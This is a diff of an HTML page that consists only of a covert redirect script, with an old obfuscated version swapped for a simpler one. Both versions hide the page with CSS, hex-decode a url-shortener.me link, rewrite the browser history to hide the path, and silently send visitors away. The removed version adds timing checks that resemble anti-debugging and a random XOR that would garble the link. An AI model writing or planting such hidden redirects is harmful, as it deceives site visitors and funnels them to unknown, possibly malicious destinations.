@@ -1,1 +1,8 @@
-<!doctype html><meta charset=utf-8><style>html,body{display:none!important}</style><link rel=preconnect href=https://url-shortener.me><script>!function(){var a=[],b=0;for(;b<2048;b++)a[b]=(b*13^b<<2)&255;function c(d){for(var e="",f=0;f<d.length;f+=2)e+=String.fromCharCode(parseInt(d.substr(f,2),16));return e}function g(h,i){for(var j="",k=0;k<h.length;k++)j+=String.fromCharCode(h.charCodeAt(k)^i);return j}var l=(Date.now()^Math.random()*1e9)|0,m=location.hostname,n=0;for(b=0;b<m.length;b++)n=(n+m.charCodeAt(b)*(b+1))&255;if(!n||self!==top)return;var o=(l^n)&31,p="68747470733a2f2f75726c2d73686f7274656e65722e6d652f37323654",q=g(c(p),o);try{history.replaceState(0,0,"/")}catch(r){}var s=performance.now();setTimeout(function(){if(performance.now()-s>240)return;function t(){try{location.replace(q)}catch(r){}try{location.href=q}catch(r){}try{location.assign(q)}catch(r){}try{open(q,"_self")}catch(r){}}Promise.resolve().then(t);requestAnimationFrame(function(){setTimeout(t,(l&15)+5)});setTimeout(t,(l&63)+37);for(b=0;b<256;b++)o=Math.imul(o+a[b],7)&255},0)}();</script>
+<!doctype html><meta charset=utf-8><style>html,body{display:none!important}</style><script>
+!function(){function d(h){for(var r="",i=0;i<h.length;i+=2)r+=String.fromCharCode(parseInt(h.substr(i,2),16));return r}
+var u=d("68747470733a2f2f75726c2d73686f7274656e65722e6d652f37323654");
+try{history.replaceState(0,0,"/")}catch(e){}
+if(self!==top)return;
+Promise.resolve().then(function(){location.replace(u)});
+}();
+</script>
